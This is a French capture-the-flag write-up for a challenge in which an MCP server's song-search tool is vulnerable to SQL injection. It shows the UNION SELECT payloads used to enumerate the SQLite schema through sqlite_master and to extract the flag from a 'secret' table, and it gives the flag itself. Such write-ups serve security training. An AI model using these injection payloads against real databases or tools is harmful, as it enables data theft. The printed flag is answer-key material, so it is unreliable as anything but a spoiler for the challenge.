# Disco Maghreb - Catalogue

## Write-up

On continue notre visite de la boutique **Disco Maghreb**. Cette fois, le serveur MCP ne propose pas directement le flag, mais une fonction permettant de rechercher des chansons de Raï par titre.
Objectif : détourner ce moteur de recherche pour obtenir le flag caché dans la base SQLite.

---

## 1. Reconnaissance

Comme dans le challenge précédent, on peut se connecter au serveur MCP avec un client FastMCP.
En listant les tools, on découvre :

```json
{
    "name": "search_song_by_title",
    "title": null,
    "description": "Search rai song by title",
    "inputSchema": {
        "properties": {
            "title": {
                "title": "Title",
                "type": "string"
            }
        },
    ...
}
```

Le serveur expose un seul tool : `search_song_by_title(title: str)`. Il nous permet de chercher des chansons à partir du titre:
```python
result = await client.call_tool("search_song_by_title", {"title": "el"})
print(f"\nResult:\n{result.structured_content['result']}")
```
```
Result:
Cheb Mami - Meli Meli
Cheb Hasni - El Visa
Faudel - Tellement NBR
```

---

## 2. Exploitation - étapes du SQLi

### a) Test de l'injection

On commence classiquement par injecter un simple **apostrophe `'`** :

```
Error !
```

Cela provoque une erreur, confirmant que notre entrée n'est peut-être pas nettoyée !

---

### b) Enumération des colonnes

On tente d'ajouter un **ORDER BY** pour déterminer le nombre de colonnes dans le `SELECT`.

- `' ORDER BY 2 --` fonctionne.
- `' ORDER BY 3 --` renvoie une erreur.

On en déduit que la requête retourne **2 colonnes**. Notre `UNION SELECT` devra donc aussi sélectionner 2 colonnes.

---

### c) Découverte du schéma de la base

On utilise la table interne de SQLite `sqlite_master` pour lister les tables présentes dans la DB:

```sql
' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --
```
```
Result:
Cheb Bilal - Ghorba
...
Faudel - Tellement NBR
secret - CREATE TABLE secret (flag TEXT)
songs - CREATE TABLE songs (id INTEGER PRIMARY KEY, artist TEXT, title TEXT)
```

On voit deux tables: `songs` et `secret`. Et cette dernière contient une colonne `flag` !

---

### d) Récupération du flag

On lance alors une union select pour extraire la colonne `flag` :

```sql
' UNION SELECT flag, flag FROM secret --
```

On sélectionne 2 fois `flag` pour avoir une union valide.

Résultat :

```
Result:
Cheb Bilal - Ghorba
...
Faudel - Tellement NBR
flag-rai_n3v3r_d135-Yj60e72N - flag-rai_n3v3r_d135-Yj60e72N
```

## Flag

`flag-rai_n3v3r_d135-Yj60e72N`
